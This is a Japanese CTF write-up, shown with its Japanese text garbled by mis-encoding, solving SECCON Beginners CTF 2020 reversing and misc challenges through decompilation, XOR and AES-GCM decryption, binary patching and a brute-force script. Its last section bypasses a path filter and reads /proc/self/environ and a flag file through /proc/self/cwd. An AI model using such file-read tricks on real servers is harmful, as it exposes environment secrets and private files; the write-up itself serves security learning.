> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: yakisoba (x86_64 ã® ELF)

Ghidra ã«æŠ•ã’ã¦ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```c
undefined8 FUN_00100820(byte *pbParm1)

{
  byte bVar1;
  undefined8 uVar2;
  
  bVar1 = *pbParm1;
  if (bVar1 != 99) {
    if (bVar1 < 100) {
      if (bVar1 == 0x30) {
        return 0xa5;
      }
      if (bVar1 == 0x4b) {
        return 0xc4;
      }
    }
    else {
      if (bVar1 == 0x96) {
        return 0x36;
      }
      if (bVar1 == 0xda) {
        return 0x87;
      }
      if (bVar1 == 0x77) {
        return 0x49;
      }
    }
    return 0x96;
  }
  bVar1 = pbParm1[1];
  if (bVar1 == 0x3e) {
    return 3;
  }
  if (bVar1 < 0x3f) {
    uVar2 = 0x54;
    if ((bVar1 != 5) && (uVar2 = 0x15, bVar1 != 0x3d)) {
      return 0xd1;
    }
  }
  else {
    uVar2 = 0xf;
    if ((bVar1 != 0x9c) && (uVar2 = 0xb8, bVar1 != 0xc9)) {
      if (bVar1 != 0x74) {
        return 0xd1;
      }
      bVar1 = pbParm1[2];
      if (bVar1 == 0x1a) {
        return 0xc0;
      }
      if (bVar1 < 0x1b) {
        if (bVar1 == 0) {
          return 200;
        }
        if (bVar1 == 1) {
          return 0xcc;
        }
      }
      else {
        if (bVar1 == 0x66) {
          bVar1 = pbParm1[3];
ï¸™
      }
      return 0xc;
    }
  }
  return uVar2;
}
```

ã“ã‚Œãã‚‰ã„ãªã‚‰äººé–“ã«ã§ã‚‚èª­ã‚ãã†ã§ã™ã€‚`pbParm1` (å…¥åŠ›æ–‡å­—åˆ—) ã¯å„æ–‡å­—ã«ã¤ã„ã¦ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã®ã¯ä¸€åº¦é™ã‚Šã§ã™ã—ã€ä¾‹ãˆã°ä»¥ä¸‹ã® 1 æ–‡å­—ç›®ã®ä¾‹ã®ã‚ˆã†ã« `bVar1 != 99` ãªã‚‰ã©ã†ã‚ãŒã„ã¦ã‚‚ `return` ã•ã‚Œã‚‹ãƒ‘ã‚¿ãƒ¼ãƒ³ã§ã¯ `99` (`'c'`) ä»¥å¤–ãŒå…¥ã‚‹ä½™åœ°ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

```c
  bVar1 = *pbParm1;
  if (bVar1 != 99) {
    if (bVar1 < 100) {
      if (bVar1 == 0x30) {
        return 0xa5;
      }
      if (bVar1 == 0x4b) {
        return 0xc4;
      }
    }
    else {
      if (bVar1 == 0x96) {
        return 0x36;
      }
      if (bVar1 == 0xda) {
        return 0x87;
      }
      if (bVar1 == 0x77) {
        return 0x49;
      }
    }
    return 0x96;
  }
  bVar1 = pbParm1[1];
```

ã“ã†ã„ã£ãŸãƒã‚¤ãƒ³ãƒˆã‚’ãŠã•ãˆã¦èª­ã‚“ã§ã„ãã¨ã€äººåŠ›ã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{sp4gh3tt1_r1pp3r1n0}
```

## [Reversing 279] ghost (68 solves)
> A program written by a ghost ğŸ‘»
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«:
> - chall.gs
> - output.txt

`chall.gs` ã¯ä»¥ä¸‹ã®ã‚ˆã†ãªå†…å®¹ã§ã—ãŸã€‚

```
/flag 64 string def /output 8 string def (%stdin) (r) file flag readline not { (I/O Error\n) print quit } if 0 1 2 index length { 1 index 1 add 3 index 3 index get xor mul 1 463 { 1 index mul 64711 mod } repeat exch pop dup output cvs print ( ) print 128 mod 1 add exch 1 add exch } repeat (\n) print quit
```

PostScript ã§ã—ã‚‡ã†ã€‚å®Ÿè¡Œã—ã¦è‰²ã€…è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ ghostscript chall.gs 
ï¸™
test
30849 2588 41619 34000 
$ ghostscript chall.gs 
ï¸™
aest
22813 46932 46854 15937 
$ ghostscript chall.gs 
ï¸™
tesp
30849 2588 41619 40953 
```

ãªã‚‹ã»ã©ã€é ­ã‹ã‚‰ 1 æ–‡å­—ãšã¤ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦ã„ã‘ã°ã‚ˆã•ãã†ã§ã™ã€‚

```python
import string
import subprocess

TARGETS = open('output.txt').read().split(' ')

known = 'ctf4b'
i = len(known)

while True:
  for c in string.printable.strip():
    try:
      output = subprocess.check_output('echo "{}" | ghostscript chall.gs'.format(known + c), shell=True).splitlines()
    except subprocess.CalledProcessError:
      continue
    output = output[3].split(' ')

    if TARGETS[i] == output[i]:
      known += c
      break

  print(known)
  i += 1
```

```
$ python solve.py
/bin/sh: 1: Syntax error: Unterminated quoted string
/bin/sh: 1: Syntax error: Unterminated quoted string
/bin/sh: 1: Syntax error: EOF in backquote substitution
ctf4b{
ctf4b{s
ctf4b{st
ï¸™
ctf4b{st4ck_m4ch1n3_1s_4_l0t_0f_fun!
/bin/sh: 1: Syntax error: Unterminated quoted string
/bin/sh: 1: Syntax error: Unterminated quoted string
/bin/sh: 1: Syntax error: EOF in backquote substitution
ctf4b{st4ck_m4ch1n3_1s_4_l0t_0f_fun!
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{st4ck_m4ch1n3_1s_4_l0t_0f_fun!}
```

## [Reversing 363] siblangs (37 solves)
> Well, they look so similar...
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: siblangs.apk

ä¸ãˆã‚‰ã‚ŒãŸ apk ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ `unzip` ã§å±•é–‹ã—ã¾ã™ã€‚å‡ºã¦ããŸ `classes.dex` ã‚’ [dex2jar](https://sourceforge.net/projects/dex2jar/) ã§ jar ã«å¤‰æ›ã—ã¦èª­ã‚“ã§ã¿ã¾ã—ã‚‡ã†ã€‚

`es.o0i.challengeapp/MainApplication.class` ã‚’ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚

```java
package es.o0i.challengeapp;

import android.app.Application;
import android.content.Context;
import com.facebook.react.PackageList;
import com.facebook.react.ReactApplication;
import com.facebook.react.ReactInstanceManager;
import com.facebook.react.ReactNativeHost;
import com.facebook.react.ReactPackage;
import com.facebook.soloader.SoLoader;
import java.util.List;

public class MainApplication extends Application implements ReactApplication {
  private final ReactNativeHost mReactNativeHost = new ReactNativeHost(this) {
      protected String getJSMainModuleName() {
        return "index";
      }
      
      protected List<ReactPackage> getPackages() {
        return (new PackageList(this)).getPackages();
      }
      
      public boolean getUseDeveloperSupport() {
        return false;
      }
    };
  
  private static void initializeFlipper(Context paramContext, ReactInstanceManager paramReactInstanceManager) {}
  
  public ReactNativeHost getReactNativeHost() {
    return this.mReactNativeHost;
  }
  
  public void onCreate() {
    super.onCreate();
    SoLoader.init((Context)this, false);
    initializeFlipper((Context)this, getReactNativeHost().getReactInstanceManager());
  }
}
```

ReactNative ãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚é–¢é€£ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¢ã—ã¦ã„ã‚‹ã¨ã€`unzip` ã§å±•é–‹ã—ãŸãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã® `assets/index.android.bundle` ã« JavaScript ã‚³ãƒ¼ãƒ‰ãŒã‚ã‚Šã¾ã—ãŸã€‚`flag` ã§æ¤œç´¢ã—ã¦ãƒ’ãƒƒãƒˆã—ãŸæ°—ã«ãªã‚‹éƒ¨åˆ†ã‚’æ•´å½¢ã—ã¦æŠœãå‡ºã—ã¾ã™ã€‚

```javascript
            function v() {
                var t;
                (0, l.default)(this, v);
                for (var o = arguments.length, n = new Array(o), c = 0; c < o; c++) n[c] = arguments[c];
                return (t = y.call.apply(y, [this].concat(n))).state = {
                    flagVal: "ctf4b{",
                    xored: [34, 63, 3, 77, 36, 20, 24, 8, 25, 71, 110, 81, 64, 87, 30, 33, 81, 15, 39, 90, 17, 27]
                }, t.handleFlagChange = function(o) {
                    t.setState({
                        flagVal: o
                    })
                }, t.onPressValidateFirstHalf = function() {
                    if ("ios" === h.Platform.OS) {
                        for (var o = "AKeyFor" + h.Platform.OS + "10.3", l = t.state.flagVal, n = 0; n < t.state.xored.length; n++)
                            if (t.state.xored[n] !== parseInt(l.charCodeAt(n) ^ o.charCodeAt(n % o.length), 10)) return void h.Alert.alert("Validation A Failed", "Try again...");
                        h.Alert.alert("Validation A Succeeded", "Great! Have you checked the other one?")
                    } else h.Alert.alert("Sorry!", "Run this app on iOS to validate! Or you can try the other one :)")
                }, t.onPressValidateLastHalf = function() {
                    "android" === h.Platform.OS ? p.default.validate(t.state.flagVal, function(t) {
                        t ? h.Alert.alert("Validation B Succeeded", "Great! Have you checked the other one?") : h.Alert.alert("Validation B Failed", "Learn once, write anywhere ... anywhere?")
                    }) : h.Alert.alert("Sorry!", "Run this app on Android to validate! Or you can try the other one :)")
                }, t
            }
```

ãƒ•ãƒ©ã‚°ã¯å‰åŠéƒ¨åˆ† (`onPressValidateFirstHalf`) ã¨å¾ŒåŠéƒ¨åˆ† (`onPressValidateLastHalf`) ã§ãã‚Œãã‚Œåˆ¥ã®ãƒã‚§ãƒƒã‚¯å‡¦ç†ãŒè¡Œã‚ã‚Œã‚‹ã‚ˆã†ã§ã™ã€‚å‰åŠéƒ¨åˆ†ã‹ã‚‰è¦‹ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

å‰åŠéƒ¨åˆ†ã§ã¯ `[34, 63, 3, 77, 36, 20, 24, 8, 25, 71, 110, 81, 64, 87, 30, 33, 81, 15, 39, 90, 17, 27]` ã¨ `"AKeyFor" + h.Platform.OS + "10.3"` ã‚’ XOR ã—ãŸæ–‡å­—åˆ—ã¨ã€ãƒ¦ãƒ¼ã‚¶ãŒå…¥åŠ›ã—ãŸæ–‡å­—åˆ—ã¨ã®æ¯”è¼ƒãŒè¡Œã‚ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ãƒã‚§ãƒƒã‚¯ã®å‰ã« `if ("ios" === h.Platform.OS) {` ã¨ã„ã†æ¡ä»¶æ–‡ãŒã‚ã‚Šã¾ã™ã‹ã‚‰ã€`h.Platform.OS` ã«å…¥ã‚‹ã®ã¯ `ios` ã§ã—ã‚‡ã†ã€‚

```
$ python2
>>> from pwn import *
>>> s = [34,63,3,77,36,20,24,8,25,71,110,81,64,87,30,33,81,15,39,90,17,27]
>>> t = "AKeyFor"+"ios"+"10.3"
>>> xor(s, t)
'ctf4b{jav4_and_j4va5cr'
```

ãƒ•ãƒ©ã‚°ã®å‰åŠéƒ¨åˆ†ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

ç¶šã„ã¦å¾ŒåŠéƒ¨åˆ†ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚`p.default.validate` ã«ã‚ˆã£ã¦ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ã®å¾ŒåŠéƒ¨åˆ†ãŒãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã§ã™ãŒã€ã“ã‚Œã¯ä¸€ä½“ã©ã“ã‹ã‚‰æ¥ãŸã®ã§ã—ã‚‡ã†ã‹ã€‚å†ã³ `flag` ã§æ¤œç´¢ã—ã¦ã¿ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚³ãƒ¼ãƒ‰ãŒãƒ’ãƒƒãƒˆã—ã¾ã—ãŸã€‚

```javascript
__d(function(g, r, i, a, m, e, d) {
    var l = r(d[0]);
    m.exports = l.NativeModules.ValidateFlagModule
}, 399, [2]);
```

ãƒã‚¤ãƒ†ã‚£ãƒ–ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã®ã‚ˆã†ã§ã™ã€‚è©²å½“ã™ã‚‹ã‚‚ã®ãŒãªã„ã‹æ¢ã—ã¦ã¿ã‚‹ã¨ã€`classes.dex` ã® `es.o0i.challengeapp/nativemodule/ValidateFlagModule.class` ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¾ã™ã€‚

```java
package es.o0i.challengeapp.nativemodule;

import com.facebook.react.bridge.ReactMethod;
import java.security.spec.AlgorithmParameterSpec;
import java.security.Key;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.Cipher;
import com.facebook.react.bridge.Callback;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import javax.crypto.SecretKey;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;

public class ValidateFlagModule extends ReactContextBaseJavaModule
{
    private static final int GCM_IV_LENGTH = 12;
    private final ReactApplicationContext reactContext;
    private final SecretKey secretKey;
    private final SecureRandom secureRandom;
    
    public ValidateFlagModule(final ReactApplicationContext reactContext) {
        super(reactContext);
        this.secureRandom = new SecureRandom();
        this.secretKey = new SecretKeySpec("IncrediblySecure".getBytes(), 0, 16, "AES");
        this.reactContext = reactContext;
    }
    
    public String getName() {
        return "ValidateFlagModule";
    }
    
    @ReactMethod
    public void validate(final String s, final Callback callback) {
        final byte[] array2;
        final byte[] array = array2 = new byte[43];
        array2[0] = 95;
        array2[1] = -59;
        array2[2] = -20;
ï¸™
        array2[40] = 94;
        array2[41] = -71;
        array2[42] = 30;
        try {
            final Cipher instance = Cipher.getInstance("AES/GCM/NoPadding");
            instance.init(2, this.secretKey, new GCMParameterSpec(128, array, 0, 12));
            final byte[] doFinal = instance.doFinal(array, 12, array.length - 12);
            final byte[] bytes = s.getBytes();
            for (int i = 0; i < doFinal.length; ++i) {
                if (bytes[i + 22] != doFinal[i]) {
                    callback.invoke(new Object[] { false });
                    return;
                }
            }
            callback.invoke(new Object[] { true });
        }
        catch (Exception ex) {
            callback.invoke(new Object[] { false });
        }
    }
}
```

AES-GCM ã§å¾©å·ã—ã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚éµã¯ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ã®ã§å¾©å·ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```java
import java.util.*;
import java.lang.*;
import java.io.*;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

class Solve {
    public static void main(String[] args) throws java.lang.Exception {
        SecretKey secretKey = new SecretKeySpec("IncrediblySecure".getBytes(), 0, 16, "AES");
        final byte[] array2;
        final byte[] array = array2 = new byte[43];
        array2[0] = 95;
//ï¸™
        array2[42] = 30;
        final Cipher instance = Cipher.getInstance("AES/GCM/NoPadding");
        instance.init(2, secretKey, new GCMParameterSpec(128, array, 0, 12));
        final byte[] doFinal = instance.doFinal(array, 12, array.length - 12);
        System.out.println(new String(doFinal));
    }
}
```

```
$ javac Solve.java && java Solve
1pt_3verywhere}
```

ãƒ•ãƒ©ã‚°ã®å¾ŒåŠéƒ¨åˆ†ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{jav4_and_j4va5cr1pt_3verywhere}
```

## [Reversing 410] sneay (23 solves)
> Rumor has it that there's a hidden easter egg which can be activated by getting high score in this game......
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: sneaky (x86_64 ã® ELF ãƒ•ã‚¡ã‚¤ãƒ«)

ä¸ãˆã‚‰ã‚ŒãŸ ELF ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã‚¹ãƒãƒ¼ã‚¯ã‚²ãƒ¼ãƒ ãŒå§‹ã¾ã‚Šã¾ã—ãŸã€‚

![SECCON 2019ã®æ±ºå‹å¤§ä¼šã¨ã„ã„ã“ã‚Œã¨ã„ã„ã€SECCONã§ã¯ã‚¹ãƒãƒ¼ã‚¯ã‚²ãƒ¼ãƒ ãŒæµè¡Œã£ã¦ã„ã‚‹ã®ã‹](../images/2020-05-24_sneaky.png)

`$` ã‚’ã²ã¨ã¤é£Ÿã¹ã‚‹ã”ã¨ã«ãƒ˜ãƒ“ã®ä½“ã‚‚ã²ã¨ã¤ä¼¸ã³ã€ã¾ãŸã‚¹ã‚³ã‚¢ã‚‚ 10 ç‚¹ä¸ŠãŒã‚Šã¾ã™ã€‚å•é¡Œæ–‡ã«ã‚ˆã‚Œã°é«˜ã„ã‚¹ã‚³ã‚¢ã‚’å–ã‚‹ã¨ä½œå‹•ã™ã‚‹ã‚¤ãƒ¼ã‚¹ã‚¿ãƒ¼ã‚¨ãƒƒã‚°ãŒã‚ã‚‹ã‚ˆã†ã§ã™ã€‚ãƒãƒ¼ãƒˆã‚’ã—ã¾ã—ã‚‡ã†ã€‚

Ghidra ã«æŠ•ã’ã¦ãƒ‡ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã¾ã™ã€‚ã‚¨ãƒ³ãƒˆãƒªãƒ¼ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰è¿½ã£ã¦ã„ãã¾ã—ã‚‡ã†ã€‚

```c
void entry(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3)

{
  undefined8 in_stack_00000000;
  
  FUN_0041b9a0(&LAB_00400780,in_stack_00000000,&stack0x00000008,FUN_0041c400,FUN_0041c4a0,uParm3);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

`FUN_0041b9a0` ã¯ `__libc_start_main` ã§ã—ã‚‡ã†ã€‚`LAB_00400780` ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚

```
undefined8 UndefinedFunction_00400780(void)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)FUN_004414a0(0x28,1);
  puVar2 = (undefined8 *)FUN_0043e690(0x10);
  puVar2[1] = 0;
  *puVar2 = 0xb0000000a;
  *(undefined8 **)puVar1 = puVar2;
  puVar1[1] = 10;
  puVar1[2] = 0;
  puVar1[3] = 200000;
  puVar1[4] = 0;
  FUN_00401300(puVar1);
  return 0;
}
```

ã“ã‚ŒãŒ `main` ã§ã—ã‚‡ã†ã€‚`puVar1` ã¯ãªã‚“ã‚‰ã‹ã®æ§‹é€ ä½“ã§ã—ã‚‡ã†ã€‚`puVar1[1]` ã« 10 ãŒä»£å…¥ã•ã‚Œã¦ã„ã¾ã™ãŒã€ã“ã‚Œã¯ `$` ã‚’å–å¾—ã—ãŸã¨ãã«å¢—ãˆã‚‹ã‚¹ã‚³ã‚¢ã§ã—ã‚‡ã†ã‹ã€‚ã¨ãªã‚‹ã¨ã€`puVar1[2]` ã‚„ `puVar1[4]` ã‚ãŸã‚Šã¯ã‚¹ã‚³ã‚¢ã®åˆæœŸå€¤ã§ã—ã‚‡ã†ã‹ã€‚

ç‰©ã¯è©¦ã—ã¨ã„ã†ã“ã¨ã§ãƒã‚¤ãƒŠãƒªã‚¨ãƒ‡ã‚£ã‚¿ã§ã„ã˜ã£ã¦ã¿ã‚‹ã¨ã€`puVar1[4] = 1234;` ã®ã‚ˆã†ã« `puVar1[4]` ã‚’ã„ã˜ã£ãŸã¨ãã«æœ€åˆã®ã‚¹ã‚³ã‚¢ãŒå¤‰åŒ–ã™ã‚‹ã“ã¨ã‚’ç¢ºèªã§ãã¾ã—ãŸã€‚`puVar1[4] = 0x06000000;` ã®ã‚ˆã†ã«é€”æ–¹ã‚‚ãªã„æ•°å€¤ã«ã—ã¦å®Ÿè¡Œã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

![ãƒãƒ¼ãƒˆãŒæˆåŠŸã—ãŸ](../images/2020-05-24_sneaky_flag.png)

ãƒ•ãƒ©ã‚°ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚

```
ctf4b{still_ez_2_cheat?}
```

## [Misc 50] Welcome (962 solves)
> Welcome to SECCON Beginners CTF 2020!
> 
> ãƒ•ãƒ©ã‚°ã¯SECCON Beginnersã®Discordã‚µãƒ¼ãƒãƒ¼ã®ä¸­ã«ã‚ã‚Šã¾ã™ã€‚ ã¾ãŸã€è³ªå•ã®éš›ã¯ ctf4b-bot ã¾ã§DMã«ã¦ãŠå£°ãŒã‘ãã ã•ã„ã€‚

ã“ã® CTF ã®å…¬å¼ Discord ã‚µãƒ¼ãƒã«å…¥ã‚‹ã¨ã€`#announcement` ã¨ã„ã†ãŠçŸ¥ã‚‰ã›ç”¨ã®ãƒãƒ£ãƒ³ãƒãƒ«ã«ãƒ•ãƒ©ã‚°ãŒæ›¸ã‹ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒã‚ã‚Šã¾ã—ãŸã€‚

```
ctf4b{sorry, we lost the ownership of our irc channel so we decided to use discord}
```

## [Misc 53] emoemoencode (471 solves)
> Do you know emo-emo-encode?
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: emoemoencode.txt

ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚

```
ğŸ£ğŸ´ğŸ¦ğŸŒ´ğŸ¢ğŸ»ğŸ³ğŸ´ğŸ¥ğŸ§ğŸ¡ğŸ®ğŸŒ°ğŸ§ğŸ²ğŸ¡ğŸ°ğŸ¨ğŸ¹ğŸŸğŸ¢ğŸ¹ğŸŸğŸ¥ğŸ­ğŸŒ°ğŸŒ°ğŸŒ°ğŸŒ°ğŸŒ°ğŸŒ°ğŸªğŸ©ğŸ½
```

çµµæ–‡å­—ã®ã‚¹ãƒ†ã‚¬ãƒã‚°ãƒ©ãƒ•ã‚£ã§ã—ã‚‡ã†ã‹ğŸ¤” ã¨ã‚Šã‚ãˆãšã€ã„ãã¤ã‹ã®æ–‡å­—ã®ã‚³ãƒ¼ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3
>>> s = open('emoemoencode.txt-2586093c6d0bf61e0babf4d142c2418fb243b188', 'rb').read().decode('utf-8')
>>> hex(ord(s[0]))
'0x1f363'
>>> hex(ord(s[1]))
'0x1f374'
>>> hex(ord(s[2]))
'0x1f366'
```

ä¸‹ä½ 8 ãƒ“ãƒƒãƒˆã ã‘ã‚’è¦‹ã¦ ASCII ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦è§£é‡ˆã™ã‚‹ã¨ `ctf` ã«ãªã‚Šã¾ã™ã€‚ãªã‚‹ã»ã©ã€‚å…¨ã¦ã®æ–‡å­—ã«å¯¾ã—ã¦ã‚„ã£ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
>>> ''.join(chr(ord(x) & 0xff) for x in s)
'ctf4b{stegan0graphy_by_em000000ji}\n'
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{stegan0graphy_by_em000000ji}
```

## [Misc 272] readme (71 solves)
> readme
> 
> nc (çœç•¥)
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: server.py

ä»¥ä¸‹ã®ã‚ˆã†ãª Python ã‚³ãƒ¼ãƒ‰ãŒä¸ãˆã‚‰ã‚Œã¾ã—ãŸã€‚

```python
#!/usr/bin/env python3
import os

assert os.path.isfile('/home/ctf/flag') # readme

if __name__ == '__main__':
    path = input("File: ")
    if not os.path.exists(path):
        exit("[-] File not found")
    if not os.path.isfile(path):
        exit("[-] Not a file")
    if '/' != path[0]:
        exit("[-] Use absolute path")
    if 'ctf' in path:
        exit("[-] Path not allowed")
    try:
        print(open(path, 'r').read())
    except:
        exit("[-] Permission denied")
```

ãªã‚‹ã»ã©ã€ãƒ•ãƒ©ã‚°ã¯ `/home/ctf/flag` ã«ã‚ã‚‹ã‚ˆã†ã§ã™ã€‚ãƒ‘ã‚¹ã‚’å…¥åŠ›ã™ã‚‹ã¨èª­ã¿è¾¼ã‚“ã§ãã‚Œã‚‹ã‚ˆã†ã§ã™ãŒã€`ctf` ãŒå«ã¾ã‚Œã¦ãŠã‚‰ãšã€ã¾ãŸçµ¶å¯¾ãƒ‘ã‚¹ã§ãªã‘ã‚Œã°ãªã‚‰ãªã„ã¨ã„ã†åˆ¶ç´„ãŒã‚ã‚Šã¾ã™ã€‚

ã¨ã‚Šã‚ãˆãš procfs ã‚’åˆ©ç”¨ã—ã¦ç’°å¢ƒå¤‰æ•°ã‚’å–å¾—ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ nc (çœç•¥)
File: /proc/self/environ
HOSTNAME=b2a8444bdc32PYTHON_PIP_VERSION=20.1SHLVL=1HOME=/home/ctfGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.7PWD=/home/ctf/serverPYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348SOCAT_PID=9669SOCAT_PPID=1SOCAT_VERSION=1.7.3.3â€¦
```

`PWD=/home/ctf/server` ã¨ã€ã‚«ãƒ¬ãƒ³ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒ `/home/ctf/server` ã«ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚`/proc/self/cwd` ãŒã“ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’å¼µã£ã¦ã„ã‚‹ã¯ãšã§ã™ã‹ã‚‰ã€`/proc/self/cwd/../` ã§ `/home/ctf/` ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã“ã¨ã‚’æœŸå¾…ã—ã¦è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ nc (çœç•¥)
File: /proc/self/cwd/../flag
ctf4b{m4g1c4l_p0w3r_0f_pr0cf5}
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
ctf4b{m4g1c4l_p0w3r_0f_pr0cf5}
```